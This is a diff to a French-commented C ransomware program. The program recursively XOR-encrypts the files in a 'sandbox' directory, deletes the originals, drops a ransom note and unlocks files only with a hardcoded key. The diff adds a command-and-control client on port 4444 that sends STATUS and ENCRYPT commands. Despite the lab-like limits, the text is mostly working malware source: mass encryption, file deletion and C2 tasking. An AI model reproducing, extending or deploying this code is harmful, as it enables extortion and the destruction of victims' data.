@@ -4,6 +4,7 @@
  * 2. Chiffrement de masse
  * 3. Demande de rançon
  * 4. Déchiffrement sous condition
+ * 5. Test de communication C2
  */
 
 #include <stdio.h>
@@ -26,6 +27,14 @@
 #define RANSOM_NOTE "RANSOM_NOTE.txt"     // Nom de la note de rançon
 #define TARGET_DIR "sandbox"              // Dossier cible
 
+// Configuration C2 (Assurez-vous que C2_SERVER_IP est dans c2_client.h ou config.h)
+#ifndef C2_SERVER_IP
+#define C2_SERVER_IP "127.0.0.1"
+#endif
+
+// Le serveur fourni écoute sur le port 4444
+#define C2_PORT 4444 
+
 // Couleurs pour le terminal
 #define RED     "\033[1;31m"
 #define GREEN   "\033[1;32m"
@@ -40,6 +49,7 @@ void create_ransom_note();
 void print_banner();
 void encrypt_all_files();
 void decrypt_all_files();
+void test_c2_connection(); // Nouvelle fonction
 
 // ============================================================================
 // FONCTIONS UTILITAIRES & LOGIQUE
@@ -50,9 +60,9 @@ void print_banner() {
     printf(RED);
     printf("╔═══════════════════════════════════════════════════════╗\n");
     printf("║                                                       ║\n");
-    printf("║            VOTRE SYSTÈME A ÉTÉ COMPROMIS !            ║\n");
+    printf("║    ⚠️  VOTRE SYSTÈME A ÉTÉ COMPROMIS ! ⚠️           ║\n");
     printf("║                                                       ║\n");
-    printf("║          Tous vos fichiers ont été chiffrés !         ║\n");
+    printf("║    Tous vos fichiers ont été chiffrés !               ║\n");
     printf("║                                                       ║\n");
     printf("╚═══════════════════════════════════════════════════════╝\n");
     printf(RESET);
@@ -81,19 +91,60 @@ void create_ransom_note() {
 }
 
 // ============================================================================
+// COMMUNICATION C2
+// ============================================================================
+void test_c2_connection() {
+    printf(CYAN "[*] Tentative de connexion au C2 (%s:%d)...\n" RESET, C2_SERVER_IP, C2_PORT);
+    
+    int sock = c2_connect(C2_SERVER_IP, C2_PORT);
+    
+    if (sock < 0) {
+        printf(RED "✗ Échec de connexion au serveur C2.\n" RESET);
+        return;
+    }
+
+    printf(GREEN "✓ Connecté au serveur C2.\n" RESET);
+
+    C2Command cmd;
+    C2Response resp;
+
+    // ÉTAPE 1 : Vérification du STATUS
+    memset(&cmd, 0, sizeof(cmd));
+    strcpy(cmd.command, "STATUS");
+
+    printf("[>] Envoi commande : STATUS\n");
+    resp = c2_send_command(sock, &cmd);
+    printf("[<] Réponse serveur : %s\n", resp.message);
+
+    // ÉTAPE 2 : Si le serveur est prêt, demander instruction ENCRYPT
+    if (resp.status == 1) {
+        memset(&cmd, 0, sizeof(cmd));
+        strcpy(cmd.command, "ENCRYPT");
+        strcpy(cmd.target, "TEST_TARGET"); // Cible fictive pour le test
+
+        printf("[>] Envoi commande : ENCRYPT\n");
+        resp = c2_send_command(sock, &cmd);
+        printf(YELLOW "[<] Instruction reçue : %s\n" RESET, resp.message);
+    } else {
+        printf(RED "⚠ Serveur non prêt ou erreur de statut.\n" RESET);
+    }
+
+    c2_disconnect(sock);
+    printf(CYAN "[*] Connexion fermée.\n" RESET);
+}
+
+// ============================================================================
 // CHIFFREMENT DE MASSE
 // ============================================================================
 void encrypt_all_files() {
     printf(CYAN "[*] Démarrage du chiffrement dans '%s'...\n" RESET, TARGET_DIR);
 
-    // 1. Allocation mémoire pour la liste des fichiers
     char (*files)[MAX_PATH] = malloc(MAX_FILES * sizeof(*files));
     if (!files) {
         perror("Erreur allocation mémoire");
         return;
     }
 
-    // 2. Scan récursif
     int count = scan_recursive(TARGET_DIR, files, MAX_FILES, 0);
     int success_count = 0;
 
@@ -102,22 +153,17 @@ void encrypt_all_files() {
     for (int i = 0; i < count; i++) {
         char *filename = files[i];
 
-        // a. Ignorer la note de rançon et les fichiers déjà chiffrés
         if (strstr(filename, RANSOM_NOTE) || strstr(filename, ENCRYPTED_EXTENSION)) {
             continue;
         }
 
-        // b. Calculer checksum (simulation d'analyse)
         uint32_t crc = calculate_crc32(filename);
         printf(" -> Chiffrement : %s (CRC32: %08X)\n", filename, crc);
 
-        // c. Créer le nom de sortie (fichier.txt -> fichier.txt.locked)
         char output_name[MAX_PATH];
         snprintf(output_name, sizeof(output_name), "%s%s", filename, ENCRYPTED_EXTENSION);
 
-        // d. Chiffrer
         if (xor_encrypt_file(filename, output_name, RANSOM_KEY) == 0) {
-            // e. Supprimer l'original seulement si le chiffrement a réussi
             if (remove(filename) == 0) {
                 success_count++;
             } else {
@@ -129,11 +175,7 @@ void encrypt_all_files() {
     }
 
     free(files);
-
-    // 3. Générer la note de rançon
     create_ransom_note();
-
-    // 4. Afficher le message final
     print_banner();
     printf(RED "\n%d fichiers ont été verrouillés.\n" RESET, success_count);
 }
@@ -144,11 +186,9 @@ void encrypt_all_files() {
 void decrypt_all_files() {
     char input_key[128];
 
-    // 2. Demander la clé
     printf(YELLOW "Entrez la clé de déchiffrement : " RESET);
     scanf("%127s", input_key);
 
-    // 3. Vérifier la clé
     if (strcmp(input_key, RANSOM_KEY) != 0) {
         printf(RED "❌ Clé incorrecte ! Accès refusé.\n" RESET);
         return;
@@ -159,26 +199,20 @@ void decrypt_all_files() {
     char (*files)[MAX_PATH] = malloc(MAX_FILES * sizeof(*files));
     if (!files) return;
 
-    // 1. Scanner pour trouver les .locked
     int count = scan_recursive(TARGET_DIR, files, MAX_FILES, 0);
     int recovered_count = 0;
 
     for (int i = 0; i < count; i++) {
         char *filename = files[i];
-
-        // Ne traiter que les fichiers qui finissent par .locked
         char *ext = strstr(filename, ENCRYPTED_EXTENSION);
+        
         if (ext && strcmp(ext, ENCRYPTED_EXTENSION) == 0) {
-            
-            // a. Construire le nom original (supprimer .locked)
             char original_name[MAX_PATH];
             size_t len = strlen(filename) - strlen(ENCRYPTED_EXTENSION);
             strncpy(original_name, filename, len);
             original_name[len] = '\0';
 
-            // b. Déchiffrer
             if (xor_decrypt_file(filename, original_name, RANSOM_KEY) == 0) {
-                // c. Supprimer le fichier .locked
                 remove(filename);
                 printf(" -> Restauré : %s\n", original_name);
                 recovered_count++;
@@ -187,8 +221,6 @@ void decrypt_all_files() {
     }
 
     free(files);
-
-    // 5. Supprimer la note de rançon
     char note_path[MAX_PATH];
     snprintf(note_path, sizeof(note_path), "%s/%s", TARGET_DIR, RANSOM_NOTE);
     remove(note_path);
@@ -205,11 +237,11 @@ int main(int argc, char *argv[]) {
         printf("UTILISATION:\n");
         printf("  %s encrypt  - Chiffrer tous les fichiers de '%s'\n", argv[0], TARGET_DIR);
         printf("  %s decrypt  - Déchiffrer tous les fichiers\n", argv[0]);
+        printf("  %s c2_test  - Tester la connexion au serveur C2\n", argv[0]); // Nouvelle option
         return 1;
     }
 
     if (strcmp(argv[1], "encrypt") == 0) {
-        // Demander confirmation pour éviter les accidents
         printf(RED "⚠️  ATTENTION : Vous allez chiffrer le dossier '%s'.\n", TARGET_DIR);
         printf("Ceci rendra les fichiers illisibles sans la clé.\n" RESET);
         printf("Confirmer ? (o/N): ");
@@ -224,7 +256,11 @@ int main(int argc, char *argv[]) {
     } 
     else if (strcmp(argv[1], "decrypt") == 0) {
         decrypt_all_files();
-    } 
+    }
+    // Ajout du cas C2
+    else if (strcmp(argv[1], "c2_test") == 0) {
+        test_c2_connection();
+    }
     else {
         printf("Commande inconnue: %s\n", argv[1]);
         return 1;
